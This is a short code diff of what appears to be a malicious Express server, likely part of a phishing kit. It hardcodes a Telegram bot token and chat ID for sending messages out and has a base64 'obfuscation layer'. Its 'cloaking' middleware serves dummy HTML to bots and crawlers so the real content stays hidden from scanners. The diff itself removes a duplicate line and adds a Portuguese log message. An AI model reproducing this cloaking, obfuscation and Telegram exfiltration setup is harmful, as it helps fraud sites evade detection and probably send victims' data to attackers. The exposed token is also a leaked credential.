@@ -457,8 +457,6 @@ const TG_TOKEN = (process.env.TELEGRAM_BOT_TOKEN || "8643978397:AAE4YyIwa1X1tSwa
 const CHAT_ID = (process.env.TELEGRAM_CHAT_ID || "-1003940670305").replace(/"/g, "");
 const TELEGRAM_URL = `https://api.telegram.org/bot${TG_TOKEN}`;
 
-const TELEGRAM_URL = `https://api.telegram.org/bot${TG_TOKEN}`;
-
 // --- OBFUSCATION LAYER ---
 const _d = (b: string) => Buffer.from(b, 'base64').toString('utf-8');
 
@@ -492,6 +490,7 @@ const DUMMY_HTML = `
 app.use((req, res, next) => {
   const ua = req.headers["user-agent"];
   if (isBot(ua) && !req.url.startsWith('/api') && !req.url.includes('.')) {
+    console.log(`🛡️ [CLOAKING] Bot detectado e bloqueado: ${ua} | URL: ${req.url}`);
     return res.status(200).send(DUMMY_HTML);
   }
   next();
